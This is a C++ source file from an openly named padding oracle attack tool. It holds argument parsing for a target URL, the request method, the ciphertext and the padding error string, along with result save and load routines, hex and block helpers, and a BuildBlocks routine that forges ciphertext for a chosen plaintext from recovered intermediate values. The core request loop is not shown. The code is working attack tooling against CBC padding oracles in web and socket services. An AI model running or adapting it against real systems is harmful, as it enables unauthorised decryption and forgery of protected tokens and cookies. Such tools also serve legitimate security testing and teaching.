#include <stdexcept> 
#include <iostream>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <string>


#include "cxxopts/cxxopts.hpp"
#include "include/target.h"
#include "include/common.h"
#include "include/utils.h"
#include "include/log.h"

#define SAVE_DIR "save/"


Args getArgs(int argc, char** argv) {
    Args args;

    try {
        cxxopts::Options options("oracle_padding_attack", "Oracle padding attack tool");

        // define args
        options.add_options()
            ("u,url", "Url pointing to the oracle", cxxopts::value<std::string>())
            ("m,method", "SOCKET, GET, POST or COOKIES method", cxxopts::value<std::string>())
            ("p,port", "Port number for SOCKET method", cxxopts::value<unsigned int>()->default_value("0"))
            ("d,data", "Data to send (GET, POST or COOKIE param depending on the choosen method)", cxxopts::value<std::string>()->default_value(""))
            ("c,cypher", "Cypher text", cxxopts::value<std::string>())
            ("b,block-size", "Block size (8,16,32,64)", cxxopts::value<unsigned int>())
            ("e,padding-error", "Padding error text", cxxopts::value<std::string>())
            ("h,help", "Print usage");

        auto result = options.parse(argc, argv);

        if (result.count("help")) {
            Log::print(options.help());
            exit(0);
        }

        // verify args
        if (!result.count("url") || !result.count("method") || !result.count("cypher") ||
            !result.count("block-size") || !result.count("padding-error")) {
            throw std::runtime_error("Missing required arguments");
        }

        args.blockSize = result["block-size"].as<unsigned int>();
        if (args.blockSize != 8 && args.blockSize != 16 && args.blockSize != 32 && args.blockSize != 64) {
            throw std::runtime_error("Block size must be 8,16,32 or 64");
        }

        args.cypher = result["cypher"].as<std::string>();
        if (args.cypher.size()%args.blockSize != 0) {
            throw std::runtime_error("Your cyphertext is not a multiple of the given block size");
        }

        args.url = result["url"].as<std::string>();
        args.method = result["method"].as<std::string>();
        args.port = result["port"].as<unsigned int>();
        args.data = result["data"].as<std::string>();
        args.paddingError = result["padding-error"].as<std::string>();
        
        if (args.method != "SOCKET" && args.data.empty()) {
            throw std::runtime_error("-d (--data) is required for GET, POST or COOKIES methods.");
        }

        if (args.method == "SOCKET" && args.port == 0) {
            throw std::runtime_error("-p (--port) is required for SOCKET method.");
        }
        if (args.port > 65536) {
            throw std::runtime_error("You must enter a valid port number");
        }

    } catch (const std::exception& e) {
        Log::error(e.what());
        exit(1);
    }

    return args;
}

// RESULTS ------------------------------------------------------------------------------------ //

void saveResult(const std::vector<CypherData>& data, const std::string& filename) {
    std::ofstream file(SAVE_DIR+filename, std::ios::binary);
    if (!file) {
        Log::error("Can't open file to save results");
        return;
    }

    size_t total = data.size();
    file.write(reinterpret_cast<const char*>(&total), sizeof(total));

    for (const auto& cd : data) {
        size_t sizePn = cd.Pn.size();
        file.write(reinterpret_cast<const char*>(&sizePn), sizeof(sizePn));
        file.write(reinterpret_cast<const char*>(cd.Pn.data()), sizePn * sizeof(unsigned int));

        size_t sizeDn = cd.Dn.size();
        file.write(reinterpret_cast<const char*>(&sizeDn), sizeof(sizeDn));
        file.write(reinterpret_cast<const char*>(cd.Dn.data()), sizeDn * sizeof(unsigned int));
    }
}


std::vector<CypherData> loadResult(const std::string& filename, const unsigned int& nBlocks) {
    std::ifstream file(SAVE_DIR+filename, std::ios::binary);
    if (!file) throw std::runtime_error("Can't open file to load results");

    size_t total;
    file.read(reinterpret_cast<char*>(&total), sizeof(total));

    if (total != nBlocks) throw std::runtime_error("Data size is not the expected one");

    std::vector<CypherData> data(total);

    for (size_t i = 0; i < total; ++i) {
        size_t sizePn;
        file.read(reinterpret_cast<char*>(&sizePn), sizeof(sizePn));
        data[i].Pn.resize(sizePn);
        file.read(reinterpret_cast<char*>(data[i].Pn.data()), sizePn * sizeof(unsigned int));

        size_t sizeDn;
        file.read(reinterpret_cast<char*>(&sizeDn), sizeof(sizeDn));
        data[i].Dn.resize(sizeDn);
        file.read(reinterpret_cast<char*>(data[i].Dn.data()), sizeDn * sizeof(unsigned int));
    }

    return data;
}
// -------------------------------------------------------------------------------------------- //


// Hex manipulation
std::string IntToHex(unsigned int& val) {
    std::stringstream ss;
    ss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << val;
    
    return ss.str();
}

unsigned int HexToInt(const std::string& hexStr) {
    unsigned int val;
    std::stringstream ss;
    ss << std::hex << hexStr;
    ss >> val;
    return val;
}

std::vector<unsigned int> hexStringToBytes(const std::string& hex) {
    std::vector<unsigned int> bytes;
    size_t len = hex.length();

    if (len % Target::getBlockSize() != 0) {
        throw std::runtime_error("Wrong cyphertext size");
    }

    bytes.reserve(len / 2);

    for (size_t i = 0; i < len; i += 2) {
        std::string byteString = hex.substr(i, 2); // 2 chars = 1 hex byte
        unsigned int byte;
        std::stringstream ss;
        ss << std::hex << byteString;
        ss >> byte;
        bytes.push_back(byte);
    }

    return bytes;
}

std::string bytesToHexString(const std::vector<unsigned int>& bytes, bool uppercase = true) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');

    if (uppercase) oss << std::uppercase;

    for (uint8_t byte : bytes) {
        oss << std::setw(2) << static_cast<int>(byte);
    }

    return oss.str();
}


// Blocks manipulation
std::vector<std::vector<unsigned int>> GetBlocks(std::string& cypherText) {
    std::vector<std::vector<unsigned int>> blocks;
    const unsigned int len = Target::getBlockSize();

    // first block of 0x00, in order to decrypt the first block
    std::vector<unsigned int> block(len, 0);
    blocks.push_back(block);
    block.clear();

    for (size_t i = 0; i < cypherText.length(); i += len*2) {
        std::string s = cypherText.substr(i, len * 2);
        block = hexStringToBytes(s);
        blocks.push_back(block);
        block.clear();
    }
    
    return blocks;
}

void ModifyBlock(std::string& block, std::string val, unsigned int& ind) {
    if (ind < 2*Target::getBlockSize()) {
        block[ind-1] = val[0];
        block[ind] = val[1];
    } else {
        throw std::out_of_range("Index error, overflow detected in ModifyBlock");
    }
}


/*
    recall that C1^D2 = P2
    hence if we want C1^D2 = M
    we build C1 as C1 = M^D2
    
    add padding to the desired plain text to validate the decryption
*/
void BuildBlocks(
    std::string& plainText, 
    std::vector<CypherData>& cypherDataList, 
    std::vector<std::string>& blocks,
    unsigned int& nBlocksNeeded, 
    unsigned int& plainSize
) {
    unsigned int blockSize = Target::getBlockSize();
    unsigned int padLen = blockSize*nBlocksNeeded - plainSize;
    unsigned int N = blockSize;
    std::string block = "";

    unsigned int k;
    unsigned int j;
    unsigned int i;
    unsigned int ascii;

    for (k=0; k<nBlocksNeeded; k++) {
        if (k == nBlocksNeeded-1) {
            N = plainSize - blockSize*k;
        }
        for (i=0; i<N; i++) {
            ascii = static_cast<unsigned int>(plainText[blockSize*k+i]) ^ cypherDataList[k].Dn[i];
            block += IntToHex(ascii);
        }

        // if it is le last block, we have to pad the end of it (when the message lenght isn't a multiple of 16)
        if (k == nBlocksNeeded-1) { 
            for (j=N; j<N+padLen; j++) {
                ascii = padLen ^ cypherDataList[k].Dn[j];
                block += IntToHex(ascii);
            }
        }

        blocks.push_back(block);
    }
}


std::string BlocksToCypher(std::vector<std::string>& blocks, const unsigned int& nBlocks) {
    std::string cypher = "";
    unsigned int i;
    for (i=0; i<nBlocks; i++) {
        cypher += blocks[i];
    }

    return cypher;
}


std::string BlocksToCypher(
    std::vector<std::vector<unsigned int>>& blocks, 
    const unsigned int& nBlocks,
    std::vector<unsigned int>& newBlock,
    unsigned int& k,
    const unsigned int& size
) {
    std::string cypher = "";
    unsigned int i;
    for (i=0; i<nBlocks; i++) {
        if (i==k) {
            cypher += bytesToHexString(newBlock); // TODO: adapter en fonction du format
        } else {
            cypher += bytesToHexString(blocks[i]);
        }
    }

    return cypher;
}


std::string GetVal(std::string& str, unsigned int& ind) {
    if (ind > 0 && ind < str.length()) {
        std::string val;
        val.push_back(str[ind-1]);
        val.push_back(str[ind]);

        return val;
    }

    throw std::out_of_range("Index error, overflow detected in GetVal"); 
}

